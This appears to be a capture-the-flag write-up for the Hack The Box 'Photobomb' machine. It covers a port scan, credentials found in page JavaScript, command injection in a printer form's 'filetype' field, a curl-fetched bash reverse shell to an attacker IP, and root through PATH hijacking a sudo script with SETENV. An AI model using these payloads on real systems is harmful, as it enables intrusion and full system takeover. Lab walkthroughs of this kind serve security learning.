- Started `rustscan` and scanned for ports.

```shell
❯ rustscan -a photobomb.htb --ulimit 5000 -- -sC -sV  | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.182:22
Open 10.10.11.182:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-20 13:13 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 0.00s elapsed
Initiating Ping Scan at 13:13
Scanning 10.10.11.182 [2 ports]
Completed Ping Scan at 13:13, 0.08s elapsed (1 total hosts)
Initiating Connect Scan at 13:13
Scanning photobomb.htb (10.10.11.182) [2 ports]
Discovered open port 80/tcp on 10.10.11.182
Discovered open port 22/tcp on 10.10.11.182
Completed Connect Scan at 13:13, 0.09s elapsed (2 total ports)
Initiating Service scan at 13:13
Scanning 2 services on photobomb.htb (10.10.11.182)
Completed Service scan at 13:13, 6.20s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.182.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 2.58s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 0.33s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 0.00s elapsed
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up, received conn-refused (0.082s latency).
Scanned at 2022-12-20 13:13:03 IST for 10s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwlzrcH3g6+RJ9JSdH4fFJPibAIpAZXAl7vCJA+98jmlaLCsANWQXth3UsQ+TCEf9YydmNXO2QAIocVR8y1NUEYBlN2xG4/7txjoXr9QShFwd10HNbULQyrGzPaFEN2O/7R90uP6lxQIDsoKJu2Ihs/4YFit79oSsCPMDPn8XS1fX/BRRhz1BDqKlLPdRIzvbkauo6QEhOiaOG1pxqOj50JVWO3XNpnzPxB01fo1GiaE4q5laGbktQagtqhz87SX7vWBwJXXKA/IennJIBPcyD1G6YUK0k6lDow+OUdXlmoxw+n370Knl6PYxyDwuDnvkPabPhkCnSvlgGKkjxvqks9axnQYxkieDqIgOmIrMheEqF6GXO5zz6WtN62UAIKAgxRPgIW0SjRw2sWBnT9GnLag74cmhpGaIoWunklT2c94J7t+kpLAcsES6+yFp9Wzbk1vsqThAss0BkVsyxzvL0U9HvcyyDKLGFlFPbsiFH7br/PuxGbqdO9Jbrrs9nx60=
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
|   256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 622B9ED3F0195B2D1811DF6F278518C2
|_http-title: Photobomb
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:13
Completed NSE at 13:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
```

- On the web-page found, `/photobomb.js` 

```html
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
```

- `/photobomb.js`

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

- Found credentials for `/prineter`.
- Accessed (http://pH0t0:b0Mb!@photobomb.htb/printer)
-  On the page we can download images in different resolutions. 
- While downloading image intercepted the request via `burpsuite`.

![screenshot here](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/39.png)

- Sent this request to `burpsuite`, and fiddled with parameters and found a command injection in the parameter, `filetype`.
- Checked this request by starting `tcpdump` on attacker machine and using `jpg;ping -c 2 10.10.14.25`, in URL encoded format

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;ping+-c+2+10.10.14.25&dimensions=30x20
```

- Got a response back on the machine

```shell
❯ sudo tcpdump -i tun0
[sudo] password for divu050704: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:43:04.794104 IP 10.10.14.25.32976 > photobomb.htb.http: Flags [S], seq 33123183, win 64240, options [mss 1460,sackOK,TS val 3619204393 ecr 0,nop,wscale 7], length 0
17:43:04.879413 IP photobomb.htb.http > 10.10.14.25.32976: Flags [S.], seq 3748798089, ack 33123184, win 65160, options [mss 1337,sackOK,TS val 1922038287 ecr 3619204393,nop,wscale 7], length 0
17:43:04.879479 IP 10.10.14.25.32976 > photobomb.htb.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 3619204479 ecr 1922038287], length 0
```

- Next made a `shell.sh` with reverse shell payload.

```shell
bash -i >& /dev/tcp/10.10.14.25/4444 0>&1
```

- Next used the following command to upload our shell, and got back a shell. (URL encode it)

```shell
curl http://10.10.14.25/shell.sh -o /tmp/shell.sh && chmod +x /tmp/shell.sh && bash -i /tmp/shell.sh
```

- Our request would look like this.

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+http%3a//10.10.14.25/shell.sh+-o+/tmp/shell.sh+%26%26+chmod+%2bx+/tmp/shell.sh+%26%26+bash+-i+/tmp/shell.sh&dimensions=30x20
```

- Got back a shell.

```shell
❯ pwncat-cs bind://0.0.0.0:4444
Ignoring index for /home/divu050704/pwncat/db/pwncat
[17:18:34] Welcome to pwncat 🐈!                                                                                                                                        __main__.py:164
[17:19:10] received connection from 10.10.11.182:46272                                                                                                                       bind.py:84
[17:19:12] 10.10.11.182:46272: registered new host w/ db                                                                                                                 manager.py:957
(local) pwncat$ back
(remote) wizard@photobomb:/home/wizard/photobomb$ ls
log  photobomb.sh  public  resized_images  server.rb  source_images
(remote) wizard@photobomb:/home/wizard/photobomb$ cd
(remote) wizard@photobomb:/home/wizard$ ls
photobomb  user.txt
(remote) wizard@photobomb:/home/wizard$ cat user.txt 
b9f0ed2134effd9ab0f742594b5759ff
```

- Checked commands that the user can run as root with `sudo -l`.

```shell
(remote) wizard@photobomb:/home/wizard$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

- We have reading rights for the user.

```shell
(remote) wizard@photobomb:/home/wizard$ ls -l  /opt/cleanup.sh 
-r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.sh
```

- `/opt/cleanup.sh`

```shell
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

- We can exploit path for `find`. 
- In the `/tmp` directory create a file named `find` with command `bash -p`

```shell
(remote) wizard@photobomb:/tmp$ echo "/bin/bash -p" > find
(remote) wizard@photobomb:/tmp$ cat find
/bin/bash -p
```

- Exploited the `SETENV` vulnerability.

```console
(remote) wizard@photobomb:/tmp$ chmod +x find
(remote) wizard@photobomb:/tmp$ sudo -u root PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb#
```